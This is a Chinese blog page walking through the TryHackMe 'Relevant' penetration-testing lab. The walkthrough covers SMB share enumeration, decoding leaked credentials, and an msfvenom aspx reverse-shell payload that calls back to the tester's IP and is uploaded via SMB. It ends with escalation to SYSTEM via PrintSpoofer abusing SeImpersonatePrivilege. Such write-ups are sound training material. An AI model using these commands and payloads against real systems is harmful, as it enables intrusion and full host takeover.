@@ -1,0 +1,456 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="题目描述 难度：描述：前置条件：  您已被分配到一个需要渗透测试的客户 在应在 7 天后发布到生产环境的环境中执行。 工作范围 客户端请求 工程师进行评估 提供的虚拟环境。客户要求最低限度 提供有关评估的信息，希望参与 从恶意行为者的眼睛进行（黑匣子渗透 test） 的客户端要求您保护两个标志（无位置 提供）作为利用证明：  User.txt Root.txt  此外，客户还提供了以下范围限额：">
+<meta property="og:type" content="article">
+<meta property="og:title" content="relevant-thm">
+<meta property="og:url" content="https://imli.ink/2024/11/16/relevant/index.html">
+<meta property="og:site_name" content="安全杂谈">
+<meta property="og:description" content="题目描述 难度：描述：前置条件：  您已被分配到一个需要渗透测试的客户 在应在 7 天后发布到生产环境的环境中执行。 工作范围 客户端请求 工程师进行评估 提供的虚拟环境。客户要求最低限度 提供有关评估的信息，希望参与 从恶意行为者的眼睛进行（黑匣子渗透 test） 的客户端要求您保护两个标志（无位置 提供）作为利用证明：  User.txt Root.txt  此外，客户还提供了以下范围限额：">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241116174645.png">
+<meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241116174724.png">
+<meta property="og:image" content="https://imli.ink/assets/img/Pasted%20image%2020241116175603.png">
+<meta property="article:published_time" content="2024-11-16T09:19:15.575Z">
+<meta property="article:modified_time" content="2024-11-16T09:19:15.575Z">
+<meta property="article:author" content="Leon">
+<meta property="article:tag" content="靶场">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://imli.ink/assets/img/Pasted%20image%2020241116174645.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>relevant-thm</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-86660611-1"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'UA-86660611-1');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/sites/">站点</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/leonooo13">项目</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2024/11/16/tomghost/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://imli.ink/2024/11/16/relevant/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://imli.ink/2024/11/16/relevant/&text=relevant-thm"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://imli.ink/2024/11/16/relevant/&title=relevant-thm"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://imli.ink/2024/11/16/relevant/&is_video=false&description=relevant-thm"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=relevant-thm&body=Check out this article: https://imli.ink/2024/11/16/relevant/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://imli.ink/2024/11/16/relevant/&title=relevant-thm"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://imli.ink/2024/11/16/relevant/&title=relevant-thm"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://imli.ink/2024/11/16/relevant/&title=relevant-thm"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://imli.ink/2024/11/16/relevant/&title=relevant-thm"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://imli.ink/2024/11/16/relevant/&name=relevant-thm&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://imli.ink/2024/11/16/relevant/&t=relevant-thm"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">2.</span> <span class="toc-text">基本信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">3.</span> <span class="toc-text">信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">3.1.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%AF%E5%BE%84%E6%9E%9A%E4%B8%BE"><span class="toc-number">3.2.</span> <span class="toc-text">路径枚举</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0"><span class="toc-number">4.</span> <span class="toc-text">漏洞发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">5.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#webshell"><span class="toc-number">6.</span> <span class="toc-text">webshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#usershell"><span class="toc-number">7.</span> <span class="toc-text">usershell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rootshell"><span class="toc-number">8.</span> <span class="toc-text">rootshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%E5%9B%9E%E9%A1%BE"><span class="toc-number">9.</span> <span class="toc-text">知识点回顾</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">10.</span> <span class="toc-text">总结</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        relevant-thm
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Leon</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-11-16T09:19:15.575Z" class="dt-published" itemprop="datePublished">2024-11-16</time>
+        
+        (Updated: <time datetime="2024-11-16T09:19:15.575Z" class="dt-updated" itemprop="dateModified">2024-11-16</time>)
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><blockquote>
+<p>难度：<br>描述：<br>前置条件：</p>
+</blockquote>
+<p>您已被分配到一个需要渗透测试的客户 在应在 7 天后发布到生产环境的环境中执行。</p>
+<p><strong>工作范围</strong></p>
+<p>客户端请求 工程师进行评估 提供的虚拟环境。客户要求最低限度 提供有关评估的信息，希望参与 从恶意行为者的眼睛进行（黑匣子渗透 test） 的客户端要求您保护两个标志（无位置 提供）作为利用证明：</p>
+<ul>
+<li>User.txt</li>
+<li>Root.txt</li>
+</ul>
+<p>此外，客户还提供了以下范围限额：</p>
+<ul>
+<li><p>此项目允许使用任何工具或技术，但我们要求您先尝试手动利用  </p>
+</li>
+<li><p>找到并记录发现的所有漏洞</p>
+</li>
+<li><p>将发现的标记提交到仪表板</p>
+</li>
+<li><p>只有分配给计算机的 IP 地址在范围内</p>
+</li>
+<li><p>查找并报告所有漏洞（是的，通往 root 的路径不止一条）</p>
+</li>
+</ul>
+<p>（角色扮演关闭）</p>
+<p>我 鼓励您将此挑战视为实际的渗透测试。 考虑写一份报告，包括执行摘要。 漏洞和利用评估以及补救建议， 因为这将使您为 eLearnSecurity 认证专业渗透测试员或职业生涯做好准备 作为现场的渗透测试人员。</p>
+<p>注意 - 此房间中没有任何内容需要 Metasploit</p>
+<hr>
+<h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><table>
+<thead>
+<tr>
+<th>🚀</th>
+<th>本地机器信息</th>
+<th>目标机器信息</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>IP</td>
+<td>10.17.5.121</td>
+<td>10.10.106.190</td>
+</tr>
+<tr>
+<td>OS</td>
+<td>kali</td>
+<td></td>
+</tr>
+</tbody></table>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Open 10.10.106.190:445</span><br><span class="line">Open 10.10.106.190:80</span><br><span class="line">Open 10.10.106.190:135</span><br><span class="line">Open 10.10.106.190:139</span><br><span class="line">Open 10.10.106.190:3389</span><br><span class="line">Open 10.10.106.190:49663</span><br><span class="line">Open 10.10.106.190:49668</span><br><span class="line">Open 10.10.106.190:49666</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">49663/tcp open  http               syn-ack ttl 124 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br></pre></td></tr></table></figure>
+<h3 id="路径枚举"><a href="#路径枚举" class="headerlink" title="路径枚举"></a>路径枚举</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enum4linux 10.10.106.190 </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">❯ smbclient -L //10.10.106.190                                                                                                  </span><br><span class="line">Password for [WORKGROUP\kali]:                                                                                                  </span><br><span class="line">                                                                                                                                </span><br><span class="line">        Sharename       Type      Comment                                                                                       </span><br><span class="line">        ---------       ----      -------                                                                                       </span><br><span class="line">        ADMIN$          Disk      Remote Admin</span><br><span class="line">        C$              Disk      Default share</span><br><span class="line">        IPC$            IPC       Remote IPC</span><br><span class="line">        nt4wrksv        Disk      </span><br><span class="line">Reconnecting with SMB1 for workgroup listing.</span><br><span class="line">do_connect: Connection to 10.10.106.190 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span><br><span class="line">Unable to connect with SMB1 -- no workgroup available</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">kali@kali ~/Documents/thm/creative </span><br><span class="line">❯ smbclient //10.10.106.190/nt4wrksv                                                                                            </span><br><span class="line">Password for [WORKGROUP\kali]:                                                                                                  </span><br><span class="line">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="line">smb: \&gt; ls</span><br><span class="line">  .                                   D        0  Sat Jul 25 17:46:04 2020</span><br><span class="line">  ..                                  D        0  Sat Jul 25 17:46:04 2020</span><br><span class="line">  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020</span><br><span class="line"></span><br><span class="line">                7735807 blocks of size 4096. 4944646 blocks available</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kali@kali ~/Documents/thm/creative [127]</span><br><span class="line">❯ echo &quot;Qm9iIC0gIVBAJCRXMHJEITEyMw==&quot; |base64 -d                                                                                </span><br><span class="line">Bob - !P@$$W0rD!123⏎                                                               kali@kali ~/Documents/thm/creative </span><br><span class="line">❯ echo &quot;QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk&quot; |base64 -d                                                                    </span><br><span class="line">Bill - Juw4nnaM4n420696969!$$$⏎                                                     kali@kali ~/Documents/thm/creative </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>SSH登录失败<br>寻找别的攻击向量<br>如果能找到文件上传的地方 和文件调用的地方可以获取webshell</p>
+<p>可以访问到smb里面的文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Documents/thm/creative]</span><br><span class="line">└─$ curl http://10.10.106.190:49663/nt4wrksv/passwords.txt</span><br><span class="line">[User Passwords - Encoded]</span><br><span class="line">Qm9iIC0gIVBAJCRXMHJEITEyMw==</span><br></pre></td></tr></table></figure>
+<h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p>获取上传aspshell 获取webshell</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><a href="/../assets/img/Pasted%20image%2020241116174645.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241116174645.png"></a></p>
+<h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p><a href="/../assets/img/Pasted%20image%2020241116174724.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241116174724.png"></a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Documents/thm/relevant]</span><br><span class="line">└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.5.121 LPORT=1234 -f aspx -o shell.aspx </span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x64 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 460 bytes</span><br><span class="line">Final size of aspx file: 3422 bytes</span><br><span class="line">Saved as: shell.aspx</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Documents/thm/relevant]</span><br><span class="line">└─$ curl http://10.10.106.190:49663/nt4wrksv/shell.aspx</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><a href="/../assets/img/Pasted%20image%2020241116175603.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241116175603.png"></a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c:\windows\system32\inetsrv&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">iis apppool\defaultapppool</span><br></pre></td></tr></table></figure>
+
+<h2 id="usershell"><a href="#usershell" class="headerlink" title="usershell"></a>usershell</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Bob\Desktop&gt; cat user.txt</span><br><span class="line">cat user.txt</span><br><span class="line">THM&#123;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="rootshell"><a href="#rootshell" class="headerlink" title="rootshell"></a>rootshell</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Bob\Desktop&gt; whoami /priv</span><br><span class="line">whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                               State   </span><br><span class="line">============================= ========================================= ========</span><br><span class="line">SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled</span><br><span class="line">SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled</span><br><span class="line">SeAuditPrivilege              Generate security audits                  Disabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled </span><br><span class="line">SeImpersonatePrivilege        Impersonate a client after authentication Enabled </span><br><span class="line">SeCreateGlobalPrivilege       Create global objects                     Enabled </span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled</span><br><span class="line">PS C:</span><br></pre></td></tr></table></figure>
+
+<p>由上图可知 当前用户似乎启用了 SeImpersonatePrivilege 令牌权限，这意味着我们可以使用令牌模拟来提升权限；接下来我们需要在目标机上执行一个漏洞利用程序–下载PrintSpoofer.exe，并将该exe文件上传到目标机（可以通过SMB服务上传文件）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir /s /b c:\ | find &quot;PrintSpoofer64.exe&quot;</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">C:\inetpub\wwwroot\nt4wrksv&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">iis apppool\defaultapppool</span><br><span class="line"></span><br><span class="line">C:\inetpub\wwwroot\nt4wrksv&gt;PrintSpoofer64.exe -i -c cmd</span><br><span class="line">PrintSpoofer64.exe -i -c cmd</span><br><span class="line">[+] Found privilege: SeImpersonatePrivilege</span><br><span class="line">[+] Named pipe listening...</span><br><span class="line">[+] CreateProcessAsUser() OK</span><br><span class="line">Microsoft Windows [Version 10.0.14393]</span><br><span class="line">(c) 2016 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">nt authority\system</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\Desktop&gt;type root.txt</span><br><span class="line">type root.txt</span><br><span class="line">THM&#123;&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="知识点回顾"><a href="#知识点回顾" class="headerlink" title="知识点回顾"></a>知识点回顾</h2><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>SMB文件上传到webshell获取<br>通过在 Windows 10 和 Server 2016&#x2F;2019 上滥用从 LOCAL&#x2F;NETWORK SERVICE 到 SYSTEM。<code>SeImpersonatePrivilege</code></p>
+<p>应该还有其他思路 有两个base64文件没有利用</p>
+</div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
+  </div>
+</article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a href="/sites/">站点</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/leonooo13">项目</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">2.</span> <span class="toc-text">基本信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">3.</span> <span class="toc-text">信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">3.1.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%AF%E5%BE%84%E6%9E%9A%E4%B8%BE"><span class="toc-number">3.2.</span> <span class="toc-text">路径枚举</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0"><span class="toc-number">4.</span> <span class="toc-text">漏洞发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">5.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#webshell"><span class="toc-number">6.</span> <span class="toc-text">webshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#usershell"><span class="toc-number">7.</span> <span class="toc-text">usershell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rootshell"><span class="toc-number">8.</span> <span class="toc-text">rootshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%E5%9B%9E%E9%A1%BE"><span class="toc-number">9.</span> <span class="toc-text">知识点回顾</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">10.</span> <span class="toc-text">总结</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://imli.ink/2024/11/16/relevant/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://imli.ink/2024/11/16/relevant/&text=relevant-thm"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://imli.ink/2024/11/16/relevant/&title=relevant-thm"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://imli.ink/2024/11/16/relevant/&is_video=false&description=relevant-thm"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=relevant-thm&body=Check out this article: https://imli.ink/2024/11/16/relevant/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://imli.ink/2024/11/16/relevant/&title=relevant-thm"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://imli.ink/2024/11/16/relevant/&title=relevant-thm"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://imli.ink/2024/11/16/relevant/&title=relevant-thm"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://imli.ink/2024/11/16/relevant/&title=relevant-thm"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://imli.ink/2024/11/16/relevant/&name=relevant-thm&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://imli.ink/2024/11/16/relevant/&t=relevant-thm"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
